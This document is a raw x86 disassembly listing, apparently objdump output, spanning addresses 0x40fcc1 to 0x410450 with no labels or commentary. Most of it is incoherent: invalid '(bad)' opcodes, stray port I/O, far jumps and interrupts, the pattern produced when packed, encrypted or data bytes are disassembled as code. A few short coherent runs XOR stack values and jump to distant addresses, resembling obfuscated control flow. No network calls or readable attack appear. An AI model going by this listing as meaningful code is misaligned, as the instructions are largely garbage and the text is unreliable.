  40fcc1:	test   BYTE PTR [edx],0x2b
  40fcc4:	test   BYTE PTR [ebx],bh
  40fcc6:	iret   
  40fcc7:	add    al,0x4f
  40fcc9:	lock mov eax,ds:0x749dd23
  40fccf:	jne    0x40fd2f
  40fcd1:	rol    BYTE PTR ds:0x8933144c,1
  40fcd7:	shl    BYTE PTR [eax+0x74],1
  40fcda:	test   al,0x98
  40fcdc:	mov    edi,0x4a7f8627
  40fce1:	(bad)  
  40fce2:	xchg   ebx,eax
  40fce3:	lds    esp,FWORD PTR [edx+ebx*8-0x52]
  40fce7:	push   es
  40fce8:	adc    ebx,DWORD PTR [ebp-0x7e]
  40fceb:	sbb    ebp,ecx
  40fced:	jno    0x40fc94
  40fcef:	mov    WORD PTR [edi-0x25],es
  40fcf2:	aaa    
  40fcf3:	jecxz  0x40fca2
  40fcf5:	mov    ebx,0x59028bf1
  40fcfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fcfb:	pop    edx
  40fcfc:	sbb    dh,dl
  40fcfe:	jo     0x40fc89
  40fd00:	inc    ebx
  40fd01:	dec    esi
  40fd02:	mov    esp,0x9247d2c6
  40fd07:	test   BYTE PTR [ebx],dh
  40fd09:	ficomp WORD PTR [ebx-0x7a]
  40fd0c:	sub    esi,DWORD PTR [ecx]
  40fd0e:	pop    ebp
  40fd0f:	cmp    eax,0x7e9e239e
  40fd14:	adc    eax,0x3f14588e
  40fd19:	mov    esi,DWORD PTR [ebx+esi*1+0x1670ed09]
  40fd20:	sbb    ebp,DWORD PTR [eax+ebx*1-0x6c9f814b]
  40fd27:	sub    ecx,DWORD PTR [eax]
  40fd29:	dec    esp
  40fd2a:	xchg   edx,eax
  40fd2b:	dec    ebp
  40fd2c:	adc    al,BYTE PTR [eax+ebx*2]
  40fd2f:	in     eax,0xb9
  40fd31:	add    eax,0xa949655f
  40fd36:	inc    DWORD PTR [edi+ecx*1+0x2c8c8798]
  40fd3d:	(bad)  
  40fd3e:	adc    DWORD PTR [esi],eax
  40fd40:	imul   esi,DWORD PTR [ebp+0x56bab193],0xa4f38234
  40fd4a:	(bad)  
  40fd4b:	dec    ebx
  40fd4c:	adc    BYTE PTR [ebx-0x1],dl
  40fd4f:	and    al,0xc4
  40fd51:	js     0x40fd40
  40fd53:	aaa    
  40fd54:	loop   0x40fce5
  40fd56:	sub    DWORD PTR [eax+eiz*8-0xab96491],edi
  40fd5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd5e:	adc    eax,0x4503dbe0
  40fd63:	int    0x99
  40fd65:	cdq    
  40fd66:	ja     0x40fdbf
  40fd68:	xchg   esi,eax
  40fd69:	out    0xa3,al
  40fd6b:	mov    DWORD PTR [esi],eax
  40fd6d:	lods   al,BYTE PTR ds:[esi]
  40fd6e:	stos   DWORD PTR es:[edi],eax
  40fd6f:	sbb    al,0x9a
  40fd71:	pop    esi
  40fd72:	js     0x40fdf3
  40fd74:	cmp    eax,0x7431a850
  40fd79:	fdivr  DWORD PTR [ecx+0x3215a80a]
  40fd7f:	rcr    DWORD PTR [ebp-0x1af7b99],0x2b
  40fd86:	cli    
  40fd87:	mov    edx,DWORD PTR [ebp-0x4]
  40fd8a:	xor    edx,eax
  40fd8c:	add    edx,ecx
  40fd8e:	cmp    edi,edx
  40fd90:	jb     0x414e2e
  40fd96:	mov    edx,DWORD PTR [ebp-0x28]
  40fd99:	mov    edi,DWORD PTR [ebp-0x4]
  40fd9c:	xor    edx,eax
  40fd9e:	xor    edi,eax
  40fda0:	add    edi,ecx
  40fda2:	add    edx,ecx
  40fda4:	imul   edx,edi
  40fda7:	mov    edi,DWORD PTR [ebp-0x8]
  40fdaa:	jmp    0x410032
  40fdaf:	mov    ecx,0xcac93ec5
  40fdb5:	(bad)  
  40fdb6:	leave  
  40fdb7:	dec    esp
  40fdb8:	mov    bl,0x33
  40fdba:	std    
  40fdbb:	int3   
  40fdbc:	pop    ds
  40fdbd:	mov    esi,0x784b7adb
  40fdc2:	js     0x40fda9
  40fdc4:	jle    0x40fe3e
  40fdc6:	js     0x40fdd0
  40fdc8:	dec    ecx
  40fdc9:	mov    gs,WORD PTR [esi-0x2e]
  40fdcc:	jne    0x40fd5e
  40fdce:	xor    DWORD PTR [esi],ebp
  40fdd0:	imul   ebx,DWORD PTR [edx],0x70
  40fdd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fdd4:	repnz out dx,al
  40fdd6:	ins    DWORD PTR es:[edi],dx
  40fdd7:	pop    es
  40fdd8:	adc    esp,ebx
  40fdda:	(bad)  
  40fddb:	imul   edi,DWORD PTR [ebx+edx*1],0xccef82bf
  40fde2:	adc    ecx,DWORD PTR [esi]
  40fde4:	js     0x40fe63
  40fde6:	ds or  eax,0x51996946
  40fdec:	fisttp DWORD PTR [edx]
  40fdee:	out    0x5f,al
  40fdf0:	sahf   
  40fdf1:	cmp    al,0x94
  40fdf3:	and    DWORD PTR [ebx-0x64],ecx
  40fdf6:	add    DWORD PTR [ebx-0x3138a1ab],edi
  40fdfc:	into   
  40fdfd:	iret   
  40fdfe:	mov    ah,0xd6
  40fe00:	mov    ds:0xf44f6828,al
  40fe05:	hlt    
  40fe06:	fcomp  QWORD PTR [edx+0x2d]
  40fe09:	pop    edi
  40fe0a:	in     al,0xcf
  40fe0c:	bound  ebx,QWORD PTR [ecx+0x45]
  40fe0f:	jmp    0x1d0e:0x5613b3c1
  40fe16:	mov    bl,0x67
  40fe18:	shr    BYTE PTR [edi],cl
  40fe1a:	mov    al,0xb7
  40fe1c:	xchg   ebp,eax
  40fe1d:	push   0xc5f04331
  40fe22:	mov    ds:0xddcf8e19,eax
  40fe27:	sub    esp,0x99a88d00
  40fe2d:	scas   eax,DWORD PTR es:[edi]
  40fe2e:	repz inc ebx
  40fe30:	dec    ecx
  40fe31:	inc    esp
  40fe32:	sub    eax,DWORD PTR [esi]
  40fe34:	(bad)  
  40fe35:	xor    DWORD PTR [edx+ebp*8+0x15913f3c],edx
  40fe3c:	or     DWORD PTR [ebx],0xffffffef
  40fe3f:	cmovle ebx,DWORD PTR [eax+esi*8+0x51cc348b]
  40fe47:	jle    0x40fe1d
  40fe49:	aam    0xe
  40fe4b:	arpl   WORD PTR [edx-0x28955cc7],bp
  40fe51:	mov    al,ds:0x435a7737
  40fe56:	xchg   ebp,eax
  40fe57:	out    0xa,al
  40fe59:	inc    eax
  40fe5a:	test   DWORD PTR [edi+0x59788b78],esp
  40fe60:	cs aas 
  40fe62:	imul   edi,edx,0x50937422
  40fe68:	push   ds
  40fe69:	mov    bl,0x57
  40fe6b:	push   0xfffffff1
  40fe6d:	dec    edx
  40fe6e:	into   
  40fe6f:	rcl    DWORD PTR [esi],0x3b
  40fe72:	sub    al,0x48
  40fe74:	gs mov ah,0xca
  40fe77:	leave  
  40fe78:	aad    0x61
  40fe7a:	xor    ch,BYTE PTR [edi-0x75]
  40fe7d:	pop    ebx
  40fe7e:	cmp    edi,edx
  40fe80:	xchg   ebx,eax
  40fe81:	ins    BYTE PTR es:[edi],dx
  40fe82:	out    dx,eax
  40fe83:	pop    edi
  40fe84:	add    esp,DWORD PTR [esi-0x55]
  40fe87:	add    eax,0x7b237d1c
  40fe8c:	cmp    BYTE PTR [ecx-0x5ee0f994],bh
  40fe92:	add    al,0xa8
  40fe94:	outs   dx,DWORD PTR ds:[esi]
  40fe95:	dec    ecx
  40fe96:	jp     0x40fece
  40fe98:	push   0x41
  40fe9a:	or     dl,BYTE PTR [eax-0x39f5697a]
  40fea0:	adc    al,0x5f
  40fea2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fea3:	jns    0x40ff00
  40fea5:	xor    eax,DWORD PTR [ebp+0x44]
  40fea8:	aaa    
  40fea9:	fsub   DWORD PTR [ecx+edi*1-0x14]
  40fead:	ja     0x40fe3e
  40feaf:	cmp    BYTE PTR [ebp+eax*2-0xe],al
  40feb3:	(bad)  
  40feb4:	dec    ebp
  40feb5:	mov    DWORD PTR [ebp+0xf],ecx
  40feb8:	bound  ecx,QWORD PTR [ecx+0x6944ac2d]
  40febe:	aaa    
  40febf:	and    ebp,ecx
  40fec1:	xlat   BYTE PTR ds:[ebx]
  40fec2:	or     dl,al
  40fec4:	pop    eax
  40fec5:	sbb    al,0x36
  40fec7:	ret    
  40fec8:	bound  ebp,QWORD PTR [eax]
  40feca:	mov    DWORD PTR [edx+eax*8+0x5f30a3a1],eax
  40fed1:	dec    eax
  40fed2:	nop
  40fed3:	ss loop 0x40fee6
  40fed6:	adc    eax,0x81f71aff
  40fedb:	sbb    ecx,DWORD PTR [ebx-0x14]
  40fede:	mov    al,ds:0xd30c99d0
  40fee3:	xor    eax,esp
  40fee5:	sbb    dh,BYTE PTR [edx-0x1aa67f6c]
  40feeb:	xor    ah,ah
  40feed:	xchg   ebp,eax
  40feee:	outs   dx,BYTE PTR ds:[esi]
  40feef:	push   ebp
  40fef0:	shl    DWORD PTR [ebx-0x4f5fa424],cl
  40fef6:	repz xor al,0x63
  40fef9:	add    DWORD PTR [ebx],0xffffff88
  40fefc:	jge    0x40fed7
  40fefe:	leave  
  40feff:	out    0x5,al
  40ff01:	(bad)  
  40ff02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff03:	push   esi
  40ff04:	dec    ebp
  40ff05:	mov    BYTE PTR [edi-0x499e3e4e],0x6c
  40ff0c:	fld    TBYTE PTR [edi+0x42]
  40ff0f:	mov    WORD PTR [ecx],?
  40ff11:	adc    cl,BYTE PTR [ebp+0x39c69350]
  40ff17:	fld    TBYTE PTR [ebp+0x2047e979]
  40ff1d:	mov    al,ds:0xf3052b99
  40ff22:	push   ecx
  40ff23:	(bad)  
  40ff24:	lods   eax,DWORD PTR ds:[esi]
  40ff25:	cmc    
  40ff26:	xchg   ebx,eax
  40ff27:	jp     0x40fec7
  40ff29:	mov    ebx,0xb065deee
  40ff2e:	dec    esi
  40ff2f:	repz and eax,0xc1ca958b
  40ff35:	xor    cl,BYTE PTR [esi+0x27]
  40ff38:	and    cl,BYTE PTR [ebx-0x70]
  40ff3b:	adc    eax,0x1241e2a3
  40ff40:	stc    
  40ff41:	sub    al,0xb0
  40ff43:	retf   
  40ff44:	mov    DWORD PTR [edi+0x38e64b4d],eax
  40ff4a:	inc    eax
  40ff4b:	outs   dx,BYTE PTR ds:[esi]
  40ff4c:	fadd   QWORD PTR [edi-0x2844b488]
  40ff52:	pop    ss
  40ff53:	outs   dx,DWORD PTR ds:[esi]
  40ff54:	int    0xc8
  40ff56:	and    al,0x7a
  40ff58:	or     al,0x12
  40ff5a:	jo     0x40ff4c
  40ff5c:	or     DWORD PTR [ebp+eax*4-0x3a],edx
  40ff60:	enter  0x9bed,0xb5
  40ff64:	add    DWORD PTR [esi],0xd7bbd179
  40ff6a:	pop    edi
  40ff6b:	mov    al,0x2e
  40ff6d:	arpl   di,si
  40ff6f:	outs   dx,BYTE PTR ds:[esi]
  40ff71:	adc    dh,cl
  40ff73:	jmp    0xd54d:0x25608175
  40ff7a:	jmp    0x98dbe885
  40ff7f:	jne    0x40ff66
  40ff81:	sbb    DWORD PTR [ebp-0x3273d6b0],eax
  40ff87:	xor    DWORD PTR [esi+edx*1-0x5101fbcb],eax
  40ff8e:	jo     0x41000b
  40ff90:	mov    DWORD PTR [ecx+0x15],esi
  40ff93:	and    al,0xf1
  40ff95:	jp     0x40ff3d
  40ff97:	xchg   ebp,eax
  40ff98:	jg     0x40fffe
  40ff9a:	gs cmp al,0xed
  40ff9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff9e:	sar    DWORD PTR [edi+0x5c],1
  40ffa1:	mov    ch,0xcd
  40ffa3:	js     0x410021
  40ffa5:	inc    ebp
  40ffa6:	cmpxchg BYTE PTR [esi-0x67689525],ch
  40ffad:	and    al,0x9c
  40ffaf:	ret    
  40ffb0:	xchg   esi,eax
  40ffb1:	dec    edi
  40ffb2:	scas   eax,DWORD PTR es:[edi]
  40ffb3:	jae    0x410019
  40ffb5:	inc    ebx
  40ffb6:	outs   dx,DWORD PTR ds:[esi]
  40ffb7:	push   esp
  40ffb8:	xchg   DWORD PTR [eax],edx
  40ffba:	out    0x32,eax
  40ffbc:	ret    
  40ffbd:	mov    eax,ds:0xa7c3d05a
  40ffc2:	mov    esi,0x1fbcc14b
  40ffc7:	imul   esp,DWORD PTR [edx],0xf460065c
  40ffcd:	(bad)  
  40ffce:	adc    BYTE PTR [ebx-0x33],ch
  40ffd1:	lea    ecx,[esi-0x14025309]
  40ffd7:	xchg   ebp,eax
  40ffd8:	mov    dh,0xe9
  40ffda:	pop    ds
  40ffdb:	sub    BYTE PTR [edx+eax*1+0x77],cl
  40ffdf:	mov    cl,0x1d
  40ffe1:	shr    dh,0x70
  40ffe4:	pop    ebp
  40ffe5:	jmp    0xefe9:0xbf2995fa
  40ffec:	jecxz  0x40fff5
  40ffee:	push   ebp
  40ffef:	loop   0x40ffcf
  40fff1:	jmp    0x410004
  40fff3:	fwait
  40fff4:	js     0x40ffc4
  40fff6:	(bad)  
  40fff7:	retf   
  40fff8:	jbe    0x40ffb7
  40fffa:	mov    ecx,0x695ae76d
  40ffff:	or     DWORD PTR [esp+edi*8+0xfba1746],edi
  410006:	and    BYTE PTR [eax-0xa22de3e],al
  41000c:	cmc    
  41000d:	mov    bh,0xbd
  41000f:	pop    edx
  410010:	jmp    0x410087
  410012:	mov    ebx,0x344ec37a
  410017:	bound  ebx,QWORD PTR [ecx]
  410019:	in     eax,0x10
  41001b:	and    edi,DWORD PTR [ebp-0x4e]
  41001e:	outs   dx,DWORD PTR ds:[esi]
  41001f:	(bad)  
  410020:	mov    ebp,0x65c77165
  410025:	xchg   edx,eax
  410026:	mov    cs,WORD PTR [eax-0x2]
  410029:	inc    edx
  41002a:	mov    esi,edi
  41002c:	cmp    DWORD PTR [eax-0x3ee5bf6],ebx
  410032:	mov    ebx,DWORD PTR [ebp-0x10]
  410035:	sub    ebx,edi
  410037:	cmp    ebx,edx
  410039:	ja     0x41004b
  41003f:	mov    edx,DWORD PTR [ebp-0x4]
  410042:	xor    edx,eax
  410044:	add    edx,ecx
  410046:	jmp    0x41220c
  41004b:	mov    edx,DWORD PTR [ebp-0x2c]
  41004e:	mov    edi,DWORD PTR [ebp-0x4]
  410051:	xor    edx,eax
  410053:	xor    edi,eax
  410055:	add    edi,ecx
  410057:	jmp    0x4102df
  41005c:	sar    DWORD PTR [eax+edx*8],cl
  41005f:	int    0xd7
  410061:	(bad)  
  410063:	ret    0x69c5
  410066:	xchg   ebx,eax
  410067:	daa    
  410068:	iret   
  410069:	inc    ebx
  41006a:	xchg   esi,eax
  41006b:	out    0xe7,al
  41006d:	dec    eax
  41006e:	js     0x4100e8
  410070:	in     eax,0x7e
  410072:	js     0x4100ec
  410074:	push   ebp
  410075:	in     al,0x56
  410077:	or     ebp,eax
  410079:	enter  0xb363,0xc0
  41007d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41007e:	fprem1 
  410080:	aad    0xdc
  410082:	arpl   WORD PTR [ecx],di
  410084:	mov    ch,0xfd
  410086:	lods   al,BYTE PTR ds:[esi]
  410087:	es jo  0x4100a6
  41008a:	mov    dl,0xdc
  41008c:	mov    ds:0xc883210,eax
  410091:	or     BYTE PTR ds:0xb960a969,al
  410097:	pop    ds
  410098:	adc    esi,DWORD PTR [eax-0x21]
  41009b:	lds    esp,FWORD PTR [edx]
  41009d:	mov    DWORD PTR [ecx-0x22],edi
  4100a0:	pop    ebp
  4100a1:	lods   eax,DWORD PTR ds:[esi]
  4100a2:	adc    DWORD PTR [edx],edx
  4100a4:	pop    eax
  4100a5:	imul   esi,edx,0xb
  4100a8:	pop    edx
  4100a9:	test   BYTE PTR ds:0xe5b41b9f,bl
  4100af:	mov    ebx,0xd1dfe91c
  4100b4:	psraw  mm6,mm7
  4100b7:	(bad)  
  4100b8:	sub    ah,BYTE PTR [edi+0x10]
  4100bb:	loopne 0x410139
  4100bd:	push   ds
  4100be:	clc    
  4100bf:	mov    cs,WORD PTR [ebx-0x413c1228]
  4100c5:	jae    0x41010c
  4100c7:	(bad)  
  4100c8:	lods   eax,DWORD PTR ds:[esi]
  4100c9:	rcr    BYTE PTR [esp+edx*8],0xa2
  4100cd:	aas    
  4100ce:	mov    ebp,0x386c2516
  4100d3:	(bad)  
  4100d4:	adc    DWORD PTR [esi-0x2f],ebx
  4100d7:	cmp    ch,BYTE PTR cs:[esi+0x3d]
  4100db:	push   es
  4100dc:	inc    ecx
  4100dd:	adc    eax,0xe998c70a
  4100e2:	xchg   esp,eax
  4100e3:	jmp    0x24c5f2ae
  4100e8:	adc    al,0x4a
  4100ea:	gs dec ebx
  4100ec:	add    al,0xe0
  4100ee:	jmp    esp
  4100f0:	cld    
  4100f1:	(bad)  
  4100f2:	por    mm0,QWORD PTR [edi-0x4e]
  4100f6:	stos   DWORD PTR es:[edi],eax
  4100f7:	push   edi
  4100f8:	xchg   esi,eax
  4100f9:	mov    eax,ds:0x68d2ab4f
  4100fe:	cs cmp al,0xc7
  410101:	inc    ebp
  410102:	sbb    al,0x35
  410104:	iret   
  410105:	imul   esp,DWORD PTR [edi+0x6e],0xb50e22ea
  41010c:	or     al,0xc
  41010e:	fsub   QWORD PTR [eax]
  410110:	daa    
  410111:	or     ecx,DWORD PTR [esi]
  410113:	add    edx,0x75
  410116:	lods   al,BYTE PTR ds:[esi]
  410117:	add    BYTE PTR [bx+si-0x2995],bl
  41011c:	sub    dh,BYTE PTR [edx+edx*4-0x7b]
  410120:	mov    al,ds:0xce0c48c4
  410125:	and    DWORD PTR [ebx],0x52
  410128:	sbb    bl,dh
  41012a:	and    eax,0x522d8e35
  41012f:	arpl   WORD PTR [esi-0x1ccd0de8],si
  410135:	pop    edx
  410136:	loope  0x410182
  410138:	(bad)  
  410139:	loope  0x410136
  41013b:	popf   
  41013c:	fnstcw WORD PTR [ecx-0x3896c2e5]
  410142:	icebp  
  410143:	and    eax,0xfacd15fe
  410148:	ss popf 
  41014a:	out    dx,al
  41014b:	mov    al,0x4a
  41014d:	xor    DWORD PTR [ecx],ecx
  41014f:	(bad)  
  410150:	cmp    eax,0x4ef4be58
  410155:	jmp    0x3de8:0x1f864891
  41015c:	aaa    
  41015d:	push   edi
  41015e:	or     ah,dl
  410160:	jno    0x41011a
  410162:	push   ds
  410163:	dec    ecx
  410164:	std    
  410165:	mov    ?,WORD PTR [ebp-0x10d1f23c]
  41016b:	lods   al,BYTE PTR ds:[esi]
  41016c:	mov    DWORD PTR [edx-0x21863d58],esp
  410172:	add    dh,cl
  410174:	push   0xa
  410176:	loop   0x410181
  410178:	pusha  
  410179:	std    
  41017a:	shl    bl,1
  41017c:	out    0xb3,al
  41017e:	adc    eax,0x2f116b27
  410183:	into   
  410184:	inc    ebp
  410185:	xor    DWORD PTR [eax+ebp*4+0x46],edi
  410189:	sub    eax,0xcb3a1d27
  41018e:	retf   0x5934
  410191:	inc    ecx
  410192:	push   eax
  410193:	mov    bh,0x86
  410195:	inc    ebp
  410196:	hlt    
  410197:	daa    
  410198:	in     al,dx
  410199:	mov    ds:0xeb66a13b,eax
  41019e:	dec    esi
  41019f:	sar    ch,0x4e
  4101a2:	or     bl,bh
  4101a4:	inc    ebx
  4101a5:	cmp    al,0xcd
  4101a7:	xlat   BYTE PTR ds:[ebx]
  4101a8:	xchg   edx,eax
  4101a9:	and    ebp,ecx
  4101ab:	dec    ebp
  4101ac:	(bad)  
  4101ad:	imul   eax,DWORD PTR [ecx-0x47],0xffffff82
  4101b1:	xor    BYTE PTR [edx-0x8],dh
  4101b4:	or     DWORD PTR [edx-0x46eeb549],ecx
  4101ba:	scas   al,BYTE PTR es:[edi]
  4101bb:	xchg   ecx,eax
  4101bc:	jno    0x4101a9
  4101be:	xchg   edi,eax
  4101bf:	das    
  4101c0:	std    
  4101c1:	mov    ss:0x6e90cb60,al
  4101c7:	(bad)  
  4101c8:	xor    edi,DWORD PTR [esi]
  4101ca:	mov    dh,0xf3
  4101cc:	cmp    esp,DWORD PTR [ecx-0x67]
  4101cf:	aam    0x37
  4101d1:	mov    bl,0xa7
  4101d3:	jno    0x4101ad
  4101d5:	lock addr16 push edx
  4101d8:	fsub   QWORD PTR [ebx+edx*8+0x6f]
  4101dc:	push   cs
  4101dd:	pop    edx
  4101de:	pop    esi
  4101df:	jb     0x410194
  4101e1:	xchg   esi,eax
  4101e2:	in     al,dx
  4101e3:	push   ebx
  4101e4:	int    0x9a
  4101e6:	pop    edi
  4101e7:	and    al,0x4a
  4101e9:	retf   
  4101ea:	popaw  
  4101ec:	ins    BYTE PTR es:[edi],dx
  4101ed:	test   eax,edx
  4101ef:	push   ebp
  4101f0:	inc    esi
  4101f1:	fxch   st(0)
  4101f3:	jb     0x410270
  4101f5:	push   0x105b3244
  4101fa:	lock clc 
  4101fc:	sbb    eax,0xef0c371e
  410201:	(bad)  
  410202:	xchg   ecx,eax
  410203:	outs   dx,BYTE PTR ds:[esi]
  410204:	mov    eax,ds:0x1a417859
  410209:	fwait
  41020a:	jne    0x4101f0
  41020c:	sub    dl,BYTE PTR [edi+ebp*2+0x8981b5e]
  410213:	aas    
  410214:	or     eax,0x6a3d7c7c
  410219:	das    
  41021a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41021b:	inc    edi
  41021c:	mov    edx,0xbafa59c3
  410221:	xor    eax,0x50c440a8
  410226:	pop    esp
  410227:	mov    ds:0x6e97b577,al
  41022c:	test   DWORD PTR [ecx],ecx
  41022e:	or     DWORD PTR [eax+0x27117a51],eax
  410234:	jne    0x410204
  410236:	and    al,0xf4
  410238:	mov    cs,WORD PTR [ecx+0x18]
  41023b:	test   DWORD PTR [ebx],esp
  41023d:	arpl   WORD PTR [ecx+0x66e21175],di
  410243:	adc    eax,ecx
  410245:	add    eax,DWORD PTR [ecx-0x35dd4292]
  41024b:	mov    dh,0x1e
  41024d:	aas    
  41024e:	fstp   QWORD PTR [edi]
  410250:	repz cmp dh,dl
  410253:	add    DWORD PTR [ecx],edi
  410255:	arpl   WORD PTR [ecx],si
  410257:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410258:	jmp    0x4102ab
  41025a:	mov    ds:0xd1662123,al
  41025f:	pop    ebp
  410260:	ins    BYTE PTR es:[edi],dx
  410261:	mov    ds:0x6ce9864d,al
  410266:	enter  0xb6ce,0xed
  41026a:	push   esp
  41026b:	in     eax,dx
  41026c:	mov    al,ds:0x80184e7a
  410271:	fcmovbe st,st(1)
  410273:	retf   0xa53e
  410276:	fld    QWORD PTR ds:0xde0e805f
  41027c:	gs out dx,eax
  41027e:	les    edi,FWORD PTR [eax+0x72]
  410281:	loope  0x41027c
  410283:	lea    ebp,[ebx-0x44]
  410286:	aam    0xf9
  410288:	jp     0x4102ce
  41028a:	sub    ebx,0xe
  41028d:	call   DWORD PTR [edi-0x147af3d9]
  410293:	inc    ecx
  410294:	or     ecx,DWORD PTR [eax+eiz*4-0x7c]
  410298:	lods   eax,DWORD PTR ds:[esi]
  410299:	xchg   BYTE PTR [edx],dl
  41029b:	cld    
  41029c:	and    esp,DWORD PTR [ebx-0x3e81fb86]
  4102a2:	xchg   ebx,eax
  4102a3:	mov    dl,0xf1
  4102a5:	rcr    DWORD PTR [eax-0x46],0xee
  4102a9:	sbb    al,0xbf
  4102ab:	idiv   ah
  4102ad:	jo     0x410263
  4102af:	lds    ebp,FWORD PTR [edx+0x3e61bedb]
  4102b5:	jb     0x41030b
  4102b7:	add    ecx,DWORD PTR [ebx+ebx*2-0xa704a53]
  4102be:	jo     0x4102ca
  4102c0:	xor    al,0xfe
  4102c2:	or     eax,0x5398e576
  4102c7:	lods   eax,DWORD PTR ds:[esi]
  4102c8:	cli    
  4102c9:	sub    ebp,DWORD PTR [edx]
  4102cb:	or     BYTE PTR [edi-0x21eb6837],dh
  4102d1:	xor    al,0x38
  4102d3:	xor    DWORD PTR [esi+ebx*2-0x1665cad5],edx
  4102da:	pusha  
  4102db:	mov    esi,0x35bc09e
  4102e0:	shr    ecx,1
  4102e2:	add    DWORD PTR [edx],0x0
  4102e5:	add    bl,al
  4102e7:	int    0xc7
  4102e9:	into   
  4102ea:	(bad)  
  4102ec:	(bad)  
  4102ee:	xchg   BYTE PTR [edi],dh
  4102f0:	jle    0x410290
  4102f2:	mov    dh,0x5f
  4102f4:	jmp    0x788f4fc0
  4102f9:	js     0x4102e0
  4102fb:	jle    0x410375
  4102fd:	js     0x41030b
  4102ff:	stos   BYTE PTR es:[edi],al
  410300:	lods   al,BYTE PTR ds:[esi]
  410301:	sbb    al,0x90
  410303:	jecxz  0x4102c9
  410305:	cmp    ebp,ecx
  410307:	loopne 0x41031a
  410309:	add    dl,BYTE PTR [ebp-0x6d54fd02]
  41030f:	sub    DWORD PTR [ebx+edi*8],eax
  410312:	repnz and BYTE PTR [ecx],ah
  410315:	cwde   
  410316:	push   eax
  410317:	jecxz  0x410379
  410319:	mov    bl,0x85
  41031b:	inc    esi
  41031c:	retf   0xa9a8
  41031f:	lock adc edx,DWORD PTR es:[ebx]
  410323:	mov    eax,ds:0xcf61f4a9
  410328:	sub    DWORD PTR [edx-0x5],0x54fb76bc
  41032f:	scas   al,BYTE PTR es:[edi]
  410330:	in     al,0x20
  410332:	test   DWORD PTR [edx-0x35],ebx
  410335:	pushf  
  410336:	lahf   
  410337:	in     al,dx
  410338:	sbb    edi,DWORD PTR [edx+0x18]
  41033b:	mov    bh,BYTE PTR [edx]
  41033d:	xchg   DWORD PTR [edx+ebp*1],edx
  410340:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410341:	out    0x4e,eax
  410343:	jl     0x4103b1
  410345:	push   0x0
  410347:	jb     0x41035d
  410349:	push   es
  41034a:	mov    ebp,DWORD PTR [edi-0x3bee2d00]
  410350:	stos   DWORD PTR es:[edi],eax
  410351:	jbe    0x4103bc
  410353:	push   ss
  410354:	xchg   ecx,eax
  410355:	fcomp  DWORD PTR [ebp-0x4]
  410358:	and    DWORD PTR [edx],ecx
  41035a:	fs fsubp st(7),st
  41035d:	enter  0x1a76,0xb6
  410361:	and    ebp,DWORD PTR [esi+0x5591055b]
  410367:	push   eax
  410368:	inc    eax
  410369:	inc    ecx
  41036a:	mov    esi,0x92526012
  41036f:	ffree  st(2)
  410371:	sahf   
  410372:	out    0xd2,al
  410374:	xor    eax,DWORD PTR [edx]
  410376:	sub    al,0x9e
  410378:	adc    edi,DWORD PTR [eax-0x33]
  41037b:	or     ah,bh
  41037d:	dec    edi
  41037e:	leave  
  41037f:	cwde   
  410380:	mov    esi,0x85a4fbf8
  410385:	scas   al,BYTE PTR es:[edi]
  410386:	push   eax
  410387:	(bad)  [edx-0x73]
  41038a:	inc    ecx
  41038b:	(bad)
  41038e:	pop    esp
  41038f:	inc    edx
  410390:	or     eax,0xf0035c3d
  410395:	aad    0xab
  410397:	ds into 
  410399:	stos   DWORD PTR es:[edi],eax
  41039a:	repnz in al,dx
  41039c:	int    0x3b
  41039e:	cdq    
  41039f:	test   al,0xb7
  4103a2:	ins    DWORD PTR es:[edi],dx
  4103a3:	mov    dh,0x5c
  4103a5:	rcl    BYTE PTR ds:0xb7f059a3,1
  4103ab:	repnz sbb esi,DWORD PTR [edx+0x4b]
  4103af:	push   cs
  4103b0:	outs   dx,DWORD PTR ds:[esi]
  4103b1:	aad    0xff
  4103b3:	and    DWORD PTR [edi],edi
  4103b5:	or     al,0x76
  4103b7:	sti    
  4103b8:	int    0x89
  4103ba:	fs xchg ebx,eax
  4103bc:	int    0x20
  4103be:	mov    ds:0xebdc1f9c,eax
  4103c3:	pop    ecx
  4103c4:	(bad)  
  4103c5:	fdivr  DWORD PTR [edi+esi*4-0x77701b9f]
  4103cc:	push   ss
  4103cd:	sahf   
  4103ce:	ins    BYTE PTR es:[edi],dx
  4103cf:	adc    esp,DWORD PTR [edi-0x3aea040e]
  4103d5:	aad    0xd9
  4103d7:	adc    eax,0x3d07987e
  4103dc:	(bad)  
  4103dd:	imul   BYTE PTR [edx+0x4f23caf1]
  4103e3:	push   eax
  4103e4:	cmp    DWORD PTR [edi+ecx*1-0x66],edi
  4103e8:	rcr    DWORD PTR [ebp+0x59],1
  4103eb:	popf   
  4103ec:	scas   eax,DWORD PTR es:[edi]
  4103ed:	add    eax,0x28412cb1
  4103f2:	shr    DWORD PTR [ecx-0x41224135],1
  4103f8:	adc    BYTE PTR [esi-0x68b347c7],0xe0
  4103ff:	aaa    
  410400:	push   DWORD PTR [edx-0x702faeb3]
  410406:	pushf  
  410407:	adc    DWORD PTR [ebp-0x21],esi
  41040a:	repz dec edx
  41040c:	or     edx,edi
  41040e:	(bad)  
  41040f:	daa    
  410410:	ins    DWORD PTR es:[edi],dx
  410411:	inc    ebp
  410412:	add    ah,al
  410414:	je     0x4103f0
  410416:	scas   eax,DWORD PTR es:[edi]
  410417:	es icebp 
  410419:	sbb    al,0x19
  41041b:	in     eax,dx
  41041c:	ds xchg edx,eax
  41041e:	(bad)  
  41041f:	divps  xmm5,XMMWORD PTR [edx-0x1a]
  410423:	jne    0x410417
  410425:	xor    dl,BYTE PTR [ebp-0x61]
  410428:	jge    0x410493
  41042a:	ss inc ebx
  41042c:	jg     0x41045e
  41042e:	add    eax,0x3ae49b93
  410433:	mov    ch,0xea
  410435:	mov    edx,0x966be0d5
  41043a:	shl    bh,1
  41043c:	out    dx,eax
  41043d:	push   0x5a479b2a
  410442:	add    edi,DWORD PTR [esi+0x6d]
  410445:	mov    al,0x81
  410447:	xor    cl,ch
  410449:	out    dx,eax
  41044a:	sbb    eax,0x5077aeb3
  41044f:	pop    edx
  410450:	ret    0xe919
